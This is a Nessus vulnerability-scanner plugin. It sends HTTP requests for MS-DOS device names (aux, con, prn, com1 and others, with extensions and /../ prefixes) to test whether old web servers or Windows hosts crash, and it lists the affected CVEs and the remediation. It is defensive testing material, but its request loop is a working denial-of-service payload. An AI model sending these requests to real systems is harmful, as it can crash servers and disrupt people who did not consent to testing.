#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# See the Nessus Scripts License for details
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added links to the Bugtraq message archive, Microsoft Knowledgebase,
#      and known vulnerable servers list
#
# Vulnerable servers:
# vWebServer v1.2.0 (and others?)
# AnalogX SimpleServer:WWW 1.08		CVE-2001-0386
# Small HTTP server 2.03		CVE-2001-0493
# acWEB HTTP server?
# Xitami Web Server                     BID:2622, CVE-2001-0391
# Jana Web Server                       BID:2704, CVE-2001-0558
# Cyberstop Web Server                  BID:3929, CVE-2002-0200
# General Windows MS-DOS Device         BID:1043, CVE-2000-0168
# Apache < 2.0.44			CVE-2003-0016
# Domino 5.0.7 and earlier		CVE-2001-0602, BID: 2575
# Darwin Streaming Server v4.1.3e	CVE-2003-0421
# Darwin Streaming Server v4.1.3f 	CVE-2003-0502
#


if(description)
{
 script_id(10930);
 script_bugtraq_id(1043, 2575, 2608, 2622, 2649, 2704, 3929, 6659, 6662);
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2003-t-0003");
 if (NASL_LEVEL >= 2200 ) script_cve_id("CVE-2001-0386", "CVE-2001-0493", "CVE-2001-0391", "CVE-2001-0558", "CVE-2002-0200", "CVE-2000-0168", "CVE-2003-0016", "CVE-2001-0602");

 script_version("$Revision: 1.25 $");
 script_name(english:"HTTP Windows 98 MS/DOS device names DOS");
 
 desc["english"] = "
It was possible to freeze or reboot Windows by
reading a MS/DOS device through HTTP, using
a file name like CON\CON, AUX.htm or AUX.

A cracker may use this flaw to make your
system crash continuously, preventing
you from working properly.

Solution : upgrade your system or use a 
HTTP server that filters those names out.

Risk factor : High";

 desc["francais"] = "
Il a été possible de geler ou faire rebooter
Windows en lisant un périphérique MS/DOS par
HTTP, via un nom comme CON\CON, AUX.htm ou AUX.

Un pirate peut utiliser ce problème pour faire 
continuellement rebooter votre système, vous 
empêchant de travailler correctement.

Solution : mettez à jour votre système ou 
utilisez un serveur HTTP qui filtre ces noms.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes Windows 98";
 summary["francais"] = "Tue Windows 98";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright("This script is Copyright (C) 2001 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");

start_denial();

dev[0] = "aux";
dev[1] = "con";
dev[2] = "prn";
dev[3] = "clock$";
dev[4] = "com1";
dev[5] = "com2";
dev[6] = "lpt1";
dev[7] = "lpt2";

i = 0;
ext[i++] = ".htm";	# Should we add .html ?
ext[i++] = ".";
ext[i++] = ". . .. ... .. .";
ext[i++] = ".asp";
ext[i++] = ".foo";
ext[i++] = ".bat";
# Special meanings
ext[i++] = "-";		# /../ prefix
ext[i++] = "+";		# /aux/aux pattern

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit (0);

 n = 0;
 for (i = 0; dev[i]; i = i + 1)
 {
  d = dev[i];
  for (j = 0; ext[j]; j = j + 1)
  {
   e = ext[j];
   if (e == "+")
    name = string("/", d, "/", d);
   else if (e == "-")
    # Kills Darwin Streaming Server v4.1.3f and earlier (Win32 only)
    name = string("/../", d);
   else
    name = string("/", d, e);
   #display(n++, ": ", name, "\n");
   req = http_get(item:name, port:port);
   soc = http_open_socket(port);
   if(soc)
   {
    send(socket:soc, data:req);
    r = http_recv(socket:soc);
    http_close_socket(soc);
   }
  }
 }
 
alive = end_denial();					     
if(!alive)
{
 security_hole(port);
 set_kb_item(name:"Host/dead", value:TRUE);
 exit(0);
}

if (http_is_dead(port: port))
{
  m = "It was possible to kill your web server by
reading a MS/DOS device, using a file name like 
CON\CON, AUX.htm or AUX.

A cracker may use this flaw to make your server crash 
continuously, preventing you from working properly.

Solution : upgrade your system or use a 
HTTP server that filters those names out.

Risk factor : High";
  security_hole(port: port, data: m);
}
